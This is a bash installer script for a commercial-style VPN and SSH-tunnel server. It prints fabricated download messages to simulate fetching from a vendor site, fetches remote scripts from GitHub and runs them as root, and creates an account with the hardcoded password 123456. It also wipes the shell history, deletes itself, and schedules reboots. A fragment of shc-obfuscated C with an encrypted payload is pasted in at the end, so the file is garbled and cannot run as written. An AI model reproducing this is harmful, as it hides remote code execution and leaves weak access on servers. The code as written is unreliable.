#!/bin/bash
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
flag=0
function lee-connect () {
echo "Connecting to http://leedzung-autoscript.net..."
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86"
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected. "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh] "
echo "Saving to: ‘reno.sh’"
echo ""
echo "reno.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘rno.sh’ saved [9555/9555] "
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘vpn.sh’"
echo ""
echo "vpn.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘vpn.sh’ saved [9555/9555]"
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘taba.sh’"
echo ""
echo "taba.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘taba.sh’ saved [9555/9555]"
sleep 0.5
echo "Resolving leedzung-autoscript.net (leedzung-autoscript.net)... 103.28.36.86 "
echo "Connecting to leedzung-autoscript.net (leedzung-autoscript.net)|103.28.36.86|:80... connected.  "
echo "200 OK"
echo "Length: 9555 (9.3K) [application/x-sh]"
echo "Saving to: ‘caca.sh’"
echo ""
echo "caca.sh          100%[=====================>]   9.33K  --.-KB/s   in 0s"
echo ""
echo "1258-05-18 13:17:27 (22.6 MB/s) - ‘caca.sh’ saved [9555/9555]"
sleep 0.5
}

apt-get update
apt-get --assume-yes install libxml-parser-perl
apt-get --assume-yes install nginx php5 php5-fpm php5-cli php5-mysql php5-mcrypt
clear
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/mysql.sh
chmod +x mysql.sh
./mysql.sh
clear
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/mysql_secure.sh
chmod +x mysql_secure.sh
./mysql_secure.sh
clear
useradd -m vps
mkdir -p /home/vps/public_html
chown -R mysql:mysql /var/lib/mysql/
chmod -R 755 /var/lib/mysql/
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
lee-connect
wget -O /etc/nginx/nginx.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/nginx.conf
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
lee-connect
wget -O /etc/nginx/conf.d/vps.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/vps-lee-83.conf
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
service php5-fpm restart
service nginx restart
clear
apt-get -y install zip unzip
cd /home/vps/public_html
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/Leepanelocs.zip
unzip Leepanelocs.zip
rm -f Leepanelocs.zip
clear
chown -R www-data:www-data /home/vps/public_html
chmod -R g+rw /home/vps/public_html
clear
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
php5enmod mcrypt
rm -r /root/ocs
wget -O /home/vps/public_html/index.html "https://github.com/llxxdd/sys/tree/master/lib/db/jig/index.html"
clear
cd
rm .sh
rm mysql.sh
rm mysql_secure.sh
rm -rf ~/.bash_history && history -c
clear
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/dotdeb.gpg
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/jcameron-key.asc
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
apt-get update;apt-get -y upgrade;apt-get -y install wget curl
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to Lee Dzung Autoscript'
apt-get -y install squid3
lee-connect
wget -O /etc/squid3/squid.conf https://github.com/llxxdd/sys/tree/master/lib/db/jig/squid.conf
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
apt-get -y install openvpn
cd /etc/openvpn/
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
lee-connect
wget -O /etc/iptables.up.rules https://github.com/llxxdd/sys/tree/master/lib/db/jig/iptables.up.rules
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
lee-connect
wget -O /home/vps/public_html/client.ovpn https://github.com/llxxdd/sys/tree/master/lib/db/jig/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn;cd
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/cronjob.tar
tar xf cronjob.tar;mv uptimes.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash sshvpn
echo "sshvpn:123456" | chpasswd
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
service ssh restart
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service ssh restart
service dropbear restart
apt-get -y install fail2ban;
service fail2ban restart
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/webmin.sh
chmod +x webmin.sh
./webmin.sh
lee-connect
wget https://github.com/llxxdd/sys/tree/master/lib/db/jig/pptp.sh
chmod +x pptp.sh
./pptp.sh
lee-connect
echo "0 0 * * * root /usr/bin/user-expire" > /etc/cron.d/user-expire
echo "0 */12 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "* * * * * service dropbear restart" > /etc/cron.d/dropbear
rm $0
clear
service openvpn restart
service squid3 restart
service ssh restart
service dropbear restart
service nginx start
clear
cd ~/
cat /dev/null > ~/.bash_history && history -c
end () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
